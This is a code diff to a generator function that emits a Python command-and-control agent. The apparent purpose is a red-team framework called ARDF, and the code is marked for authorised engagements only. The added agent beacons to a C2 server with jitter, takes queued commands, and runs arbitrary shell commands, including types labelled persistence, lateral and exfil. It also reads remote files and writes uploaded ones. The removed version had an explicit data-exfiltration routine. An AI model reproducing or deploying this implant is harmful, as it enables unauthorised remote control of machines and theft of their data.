@@ -126,71 +126,126 @@ while ($true) {{
         """Generate Python C2 agent"""
         
         script = f'''#!/usr/bin/env python3
-import socket
-import subprocess
+"""ARDF operator agent — JSON-lines TCP loop against the ARDF C2 listener.
+
+checkin -> poll -> execute -> result, with jitter. Commands are queued by
+the operator through ARDF (tier-gated); this agent only runs what the
+controller hands it. For AUTHORISED engagements only.
+"""
 import json
 import os
 import platform
+import random
+import socket
+import subprocess
 import time
 
 C2_SERVER = "{c2_server}"
 C2_PORT = {c2_port}
-ENC_KEY = b"{key}"
+TOKEN = "{key}"
+SLEEP = 10
+JITTER = 3
 
-class C2Agent:
-    def __init__(self):
-        self.running = True
-        self.modules = {{
-            'system': self.get_system_info,
-            'command': self.execute_command,
-            'file': self.handle_file_operation,
-            'exfil': self.exfiltrate_data
-        }}
-    
-    def get_system_info(self):
-        return {{
-            'hostname': platform.node(),
-            'user': os.getenv('USER', os.getenv('USERNAME')),
-            'os': platform.system(),
-            'arch': platform.machine(),
-            'pid': os.getpid(),
-            'cwd': os.getcwd()
-        }}
-    
-    def execute_command(self, command):
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return result.decode('utf-8', errors='ignore')
-        except:
-            return "Command failed"
-    
-    def handle_file_operation(self, operation, path):
-        if operation == 'read':
-            with open(path, 'rb') as f:
-                return f.read()
-        elif operation == 'write':
-            pass
-    
-    def exfiltrate_data(self, data):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((C2_SERVER, C2_PORT))
-            sock.sendall(data.encode() if isinstance(data, str) else data)
-            sock.close()
-        except:
-            pass
-    
-    def heartbeat(self):
-        while self.running:
-            try:
-                info = json.dumps(self.get_system_info())
-                self.exfiltrate_data(info)
-                time.sleep(10)
-            except:
-                time.sleep(30)
 
-agent = C2Agent()
-agent.heartbeat()
+def send(msg, timeout=15):
+    sock = socket.create_connection((C2_SERVER, C2_PORT), timeout=timeout)
+    try:
+        sock.sendall((json.dumps(msg) + "\\n").encode())
+        line = sock.makefile("r", encoding="utf-8", errors="replace").readline()
+        return json.loads(line) if line else {{}}
+    finally:
+        sock.close()
+
+
+def system_info():
+    return {{
+        "hostname": platform.node(),
+        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
+        "os": platform.system(),
+        "arch": platform.machine(),
+        "pid": os.getpid(),
+        "privilege_level": "user",
+        "beacon_type": "HTTPS",
+    }}
+
+
+def run_command(cmd, timeout=60):
+    try:
+        out = subprocess.check_output(cmd, shell=True,
+                                      stderr=subprocess.STDOUT, timeout=timeout)
+        return out.decode("utf-8", errors="ignore")
+    except subprocess.TimeoutExpired:
+        return "error: command timed out"
+    except Exception as exc:
+        return "error: %s" % exc
+
+
+def handle(c):
+    """Returns (command_id, result) or 'KILL'."""
+    ctype = c.get("command_type", "shell")
+    cid = c.get("command_id", "")
+    cmd = c.get("command") or ""
+    if ctype == "kill":
+        return "KILL", "killing agent"
+    if ctype == "sleep":
+        try:
+            globals()["SLEEP"] = max(2, int(cmd))
+        except Exception:
+            pass
+        return cid, "sleep=%d" % SLEEP
+    if ctype in ("shell", "execute", "persistence", "lateral", "exfil"):
+        return cid, run_command(cmd)
+    if ctype == "download":
+        # cmd is the remote path; return file contents via stdout
+        real = 'type "%s"' % cmd if os.name == "nt" else 'cat "%s"' % cmd
+        return cid, run_command(real, timeout=120)
+    if ctype == "upload":
+        import base64
+        content_b64 = (c.get("args") or {{}}).get("content_b64", "")
+        try:
+            data = base64.b64decode(content_b64)
+            with open(cmd, "wb") as fh:
+                fh.write(data)
+            return cid, "wrote %d bytes to %s" % (len(data), cmd)
+        except Exception as exc:
+            return cid, "error: upload failed: %s" % exc
+    return cid, "error: unsupported command_type %r" % ctype
+
+
+def main():
+    global SLEEP
+    agent_id = None
+    while True:
+        try:
+            if agent_id is None:
+                r = send({{"type": "checkin", "token": TOKEN,
+                          "agent": system_info()}})
+                agent_id = r.get("agent_id")
+                commands = r.get("commands", []) or []
+            else:
+                r = send({{"type": "poll", "token": TOKEN,
+                          "agent_id": agent_id}})
+                if r.get("type") == "error":
+                    agent_id = None  # controller restarted: re-register
+                    continue
+                commands = r.get("commands", []) or []
+            for c in commands:
+                cid, res = handle(c)
+                if cid == "KILL":
+                    send({{"type": "result", "token": TOKEN,
+                          "command_id": c.get("command_id", ""),
+                          "result": res}})
+                    return
+                send({{"type": "result", "token": TOKEN,
+                      "command_id": cid, "result": res}})
+        except Exception:
+            time.sleep(SLEEP * 3)
+            continue
+        time.sleep(max(2, SLEEP + random.randint(-JITTER, JITTER)))
+
+
+if __name__ == "__main__":
+    main()
 '''
         return script
 
